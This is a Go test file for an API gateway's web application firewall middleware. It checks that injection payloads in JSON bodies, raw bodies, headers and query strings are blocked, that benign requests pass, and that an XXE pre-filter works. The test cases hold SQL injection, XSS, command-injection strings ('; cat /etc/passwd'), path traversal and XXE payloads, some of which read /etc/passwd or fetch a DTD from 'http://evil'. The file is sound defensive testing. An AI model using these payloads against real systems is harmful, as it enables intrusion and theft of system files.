package middleware

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"api-gateway/internal/config"
)

// wafTestHandler builds the WAF middleware around a handler that returns 200, so
// a request that reaches the backend is distinguishable (200) from one the WAF
// denies (403/400/405).
func wafTestHandler(t *testing.T) http.Handler {
	t.Helper()
	mw := WAF(config.WAFConfig{Enabled: true, BlockMode: true}, fakeLogger{}, &fakeStore{})
	return mw(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
}

func wafDo(t *testing.T, h http.Handler, method, target, contentType, body string) int {
	t.Helper()
	var r *http.Request
	if body == "" {
		r = httptest.NewRequest(method, target, nil)
	} else {
		r = httptest.NewRequest(method, target, strings.NewReader(body))
	}
	if contentType != "" {
		r.Header.Set("Content-Type", contentType)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, r)
	return rec.Code
}

// TestWAF_InspectsJSONBody is the regression guard for the body-inspection gap:
// Coraza only auto-parses urlencoded/multipart bodies, so without an explicit
// JSON body processor every body-borne payload bypassed the WAF simply by using
// Content-Type: application/json — the API norm. All of these must be denied.
func TestWAF_InspectsJSONBody(t *testing.T) {
	h := wafTestHandler(t)

	cases := []struct{ name, ct, body string }{
		{"json sqli union", "application/json", `{"q":"union select * from users"}`},
		{"json sqli boolean", "application/json", `{"pass":"' OR 1=1 --"}`},
		{"json xss handler", "application/json", `{"t":"<img onerror=alert(1) src=x>"}`},
		{"json dom xss", "application/json", `{"t":"eval(document.cookie)"}`},
		{"json rce", "application/json", `{"cmd":"; whoami"}`},
		{"vnd +json suffix", "application/vnd.api+json", `{"q":"union select from x"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if code := wafDo(t, h, http.MethodPost, "/api/v1/x", c.ct, c.body); code != http.StatusForbidden {
				t.Errorf("JSON body attack not blocked: got %d, want 403", code)
			}
		})
	}
}

// TestWAF_InspectsRawBodies guards the second body-inspection gap: content types
// with no structured Coraza processor (text/plain, text/xml, octet-stream, or a
// missing Content-Type) must still have their raw body scanned, otherwise a
// payload bypasses the WAF by choosing such a type. text/xml additionally
// exercises the XXE rule, which only fires once the body is inspected.
func TestWAF_InspectsRawBodies(t *testing.T) {
	h := wafTestHandler(t)
	sqli := "union select password from users"

	cases := []struct{ name, ct, body string }{
		{"text/plain sqli", "text/plain", sqli},
		{"text/plain rce", "text/plain", "; cat /etc/passwd"},
		{"octet-stream sqli", "application/octet-stream", sqli},
		{"missing content-type sqli", "", sqli},
		{"text/xml xxe", "text/xml", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if code := wafDo(t, h, http.MethodPost, "/x", c.ct, c.body); code != http.StatusForbidden {
				t.Errorf("raw-body attack not blocked: got %d, want 403", code)
			}
		})
	}

	// A benign raw body must still pass (no false positive from forcing the body
	// variable).
	if code := wafDo(t, h, http.MethodPost, "/x", "text/plain", "hello world"); code != http.StatusOK {
		t.Errorf("benign text/plain wrongly blocked: got %d, want 200", code)
	}
}

// TestWAF_InspectsArgsAndForms confirms the established inspection paths still
// work: query args and urlencoded bodies.
func TestWAF_InspectsArgsAndForms(t *testing.T) {
	h := wafTestHandler(t)

	if code := wafDo(t, h, http.MethodGet, "/x?q=union%20select%20from%20users", "", ""); code != http.StatusForbidden {
		t.Errorf("query-arg SQLi not blocked: got %d", code)
	}
	if code := wafDo(t, h, http.MethodPost, "/x", "application/x-www-form-urlencoded", "q=union select from users"); code != http.StatusForbidden {
		t.Errorf("urlencoded SQLi not blocked: got %d", code)
	}
}

// TestWAF_InspectsHeaders guards against injection payloads smuggled in
// arbitrary request headers (e.g. X-Search), while not false-positiving on a
// JWT in Authorization.
func TestWAF_InspectsHeaders(t *testing.T) {
	h := wafTestHandler(t)

	do := func(header, value string) int {
		r := httptest.NewRequest(http.MethodGet, "/x", nil)
		r.Header.Set(header, value)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, r)
		return rec.Code
	}

	if code := do("X-Search", "union select password from users"); code != http.StatusForbidden {
		t.Errorf("header SQLi not blocked: got %d, want 403", code)
	}
	if code := do("X-Cmd", "; cat /etc/passwd"); code != http.StatusForbidden {
		t.Errorf("header RCE not blocked: got %d, want 403", code)
	}
	// A JWT in Authorization must not trip the rules (it is excluded).
	jwt := "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImV4cCI6OTk5OTk5OTk5OX0.abc-DEF_123"
	if code := do("Authorization", jwt); code != http.StatusOK {
		t.Errorf("JWT in Authorization wrongly blocked: got %d, want 200", code)
	}
	if code := do("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"); code != http.StatusOK {
		t.Errorf("benign User-Agent wrongly blocked: got %d, want 200", code)
	}
}

// TestWAF_AllowsBenign ensures the WAF is not a blanket-deny: a clean JSON
// request reaches the backend (200), so the JSON processor did not introduce a
// false positive.
func TestWAF_AllowsBenign(t *testing.T) {
	h := wafTestHandler(t)

	if code := wafDo(t, h, http.MethodPost, "/api/v1/users", "application/json", `{"name":"alice","age":30}`); code != http.StatusOK {
		t.Errorf("benign JSON wrongly blocked: got %d, want 200", code)
	}
	if code := wafDo(t, h, http.MethodGet, "/api/v1/users", "", ""); code != http.StatusOK {
		t.Errorf("benign GET wrongly blocked: got %d, want 200", code)
	}
}

// TestWAF_DisabledIsPassthrough documents that a disabled WAF does not touch
// traffic.
func TestWAF_DisabledIsPassthrough(t *testing.T) {
	mw := WAF(config.WAFConfig{Enabled: false}, fakeLogger{}, &fakeStore{})
	h := mw(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) }))
	if code := wafDo(t, h, http.MethodPost, "/x", "application/json", `{"q":"union select from users"}`); code != http.StatusOK {
		t.Errorf("disabled WAF should pass through: got %d", code)
	}
}

// wafRecordStore observes the WAF's metric + behaviour-penalty side effects.
type wafRecordStore struct {
	*fakeStore
	metrics map[string]int
	penalty int
}

func newWAFRecordStore() *wafRecordStore {
	return &wafRecordStore{fakeStore: &fakeStore{}, metrics: map[string]int{}}
}
func (s *wafRecordStore) IncrMetric(_ context.Context, name string)            { s.metrics[name]++ }
func (s *wafRecordStore) IncrBehaviorScore(_ context.Context, _ string, p int) { s.penalty += p }

// A backend response of 403/400/405 must NOT be attributed to the WAF: no
// waf_blocked metric, no forensic block, and no behaviour penalty (which would
// otherwise push clients hitting authz-protected endpoints toward auto-ban).
func TestWAF_UpstreamBlockStatusNotAttributed(t *testing.T) {
	for _, code := range []int{http.StatusForbidden, http.StatusBadRequest, http.StatusMethodNotAllowed} {
		st := newWAFRecordStore()
		h := WAF(config.WAFConfig{Enabled: true, BlockMode: true}, fakeLogger{}, st)(
			http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(code) }))

		rec := httptest.NewRecorder()
		// A benign request the WAF lets through; the backend returns `code`.
		h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/orders/1", nil))

		if rec.Code != code {
			t.Fatalf("upstream status not passed through: got %d want %d", rec.Code, code)
		}
		if st.metrics["waf_blocked"] != 0 {
			t.Fatalf("upstream %d mis-counted as waf_blocked", code)
		}
		if st.penalty != 0 {
			t.Fatalf("upstream %d added a behaviour penalty of %d", code, st.penalty)
		}
		if st.metrics["requests_passed_waf"] != 1 {
			t.Fatalf("passed request not counted as requests_passed_waf (%d)", st.metrics["requests_passed_waf"])
		}
		if n := len(st.forensic); n != 0 {
			t.Fatalf("upstream %d wrote %d forensic block events", code, n)
		}
	}
}

// A genuine WAF interruption is still counted and penalised.
func TestWAF_RealBlockStillAttributed(t *testing.T) {
	st := newWAFRecordStore()
	h := WAF(config.WAFConfig{Enabled: true, BlockMode: true}, fakeLogger{}, st)(
		http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) }))

	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/?q=1%20UNION%20SELECT%20password%20FROM%20users", nil))

	if rec.Code != http.StatusForbidden {
		t.Fatalf("SQLi not blocked: got %d", rec.Code)
	}
	if st.metrics["waf_blocked"] != 1 {
		t.Fatalf("real WAF block not counted (waf_blocked=%d)", st.metrics["waf_blocked"])
	}
	if st.penalty != 15 {
		t.Fatalf("real WAF block penalty = %d, want 15", st.penalty)
	}
	if len(st.forensic) != 1 {
		t.Fatalf("real WAF block wrote %d forensic events, want 1", len(st.forensic))
	}
}

// crsHandler builds the WAF in full OWASP CRS mode.
func crsHandler(t *testing.T) http.Handler {
	t.Helper()
	mw := WAF(config.WAFConfig{Enabled: true, BlockMode: true, UseCRS: true}, fakeLogger{}, &fakeStore{})
	return mw(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
}

// wafReqH sends a request with browser-like headers so CRS protocol-enforcement
// rules (missing User-Agent/Accept) don't add anomaly noise to benign traffic.
func wafReqH(h http.Handler, method, target string) int {
	r := httptest.NewRequest(method, target, nil)
	r.Header.Set("User-Agent", "Mozilla/5.0")
	r.Header.Set("Accept", "*/*")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, r)
	return rec.Code
}

// TestWAF_CRS_BlocksAttacksAllowsBenign proves the OWASP CRS engine loads and
// enforces: real attacks are blocked, ordinary API traffic passes.
func TestWAF_CRS_BlocksAttacksAllowsBenign(t *testing.T) {
	h := crsHandler(t)

	attacks := map[string]string{
		"sqli":      "/x?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
		"xss":       "/x?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
		"traversal": "/x?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		"rce":       "/x?cmd=%3B%20cat%20%2Fetc%2Fpasswd",
	}
	for name, target := range attacks {
		if code := wafReqH(h, http.MethodGet, target); code != http.StatusForbidden {
			t.Errorf("CRS %s: got %d, want 403", name, code)
		}
	}

	// Ordinary API request must pass (no false positive).
	if code := wafReqH(h, http.MethodGet, "/api/v1/orders?limit=10&sort=created_at"); code != http.StatusOK {
		t.Errorf("CRS benign: got %d, want 200", code)
	}
}

// TestWAF_CRS_BlocksXXE guards the XXE-under-CRS regression found in the live
// pentest: CRS v4 does not detect XML external-entity declarations (its XML
// processor eats the DTD prologue, and forcing raw inspection false-positives on
// the "<?xml" declaration). The Go screenXXE pre-filter closes the gap. Every
// XXE vector must be blocked; benign XML — including a "<?xml?>" declaration and
// a +xml suffix type — must pass untouched.
func TestWAF_CRS_BlocksXXE(t *testing.T) {
	h := crsHandler(t)

	xxe := []string{
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x.dtd">%p;]><r/>`,
		`<!DOCTYPE r SYSTEM "http://evil/x.dtd"><r>test</r>`,
		`<!DOCTYPE r PUBLIC "-//x" "file:///etc/passwd"><r/>`,
	}
	for _, body := range xxe {
		if code := wafDo(t, h, http.MethodPost, "/api", "application/xml", body); code != http.StatusForbidden {
			t.Errorf("XXE not blocked (got %d): %.50s", code, body)
		}
	}

	benign := []struct{ ct, body string }{
		{"application/xml", `<order><id>42</id></order>`},
		{"application/xml", `<?xml version="1.0" encoding="UTF-8"?><order><id>42</id></order>`},
		{"application/soap+xml", `<Envelope><Body><get>x</get></Body></Envelope>`},
	}
	for _, b := range benign {
		if code := wafDo(t, h, http.MethodPost, "/api", b.ct, b.body); code != http.StatusOK {
			t.Errorf("benign XML false-positived (got %d): %.50s", code, b.body)
		}
	}
}

// TestScreenXXE_DetectsAndRewinds unit-tests the pre-filter in isolation. The
// bug-prone part is the body rewind: after screening, the FULL body must still
// be readable by Coraza and the backend. Each case asserts both the verdict and
// that the body reads back byte-for-byte.
func TestScreenXXE_DetectsAndRewinds(t *testing.T) {
	cases := []struct {
		name     string
		ct, body string
		want     bool
	}{
		{"xxe system", "application/xml", `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`, true},
		{"xxe public", "application/xml", `<!DOCTYPE r PUBLIC "-//x" "http://evil/x">`, true},
		{"benign with decl", "application/xml", `<?xml version="1.0"?><order><id>42</id></order>`, false},
		{"sqli in xml, no xxe", "application/xml", `<r>1 UNION SELECT password FROM users</r>`, false},
		{"non-xml content-type", "application/json", `{"note":"<!DOCTYPE x SYSTEM y>"}`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodPost, "/api", strings.NewReader(tc.body))
			r.Header.Set("Content-Type", tc.ct)
			if got := screenXXE(r); got != tc.want {
				t.Fatalf("screenXXE = %v, want %v", got, tc.want)
			}
			// Rewind correctness: the whole body must survive for downstream.
			rest, err := io.ReadAll(r.Body)
			if err != nil {
				t.Fatalf("reading rewound body: %v", err)
			}
			if string(rest) != tc.body {
				t.Fatalf("body corrupted by screening:\n got  %q\n want %q", rest, tc.body)
			}
		})
	}
}
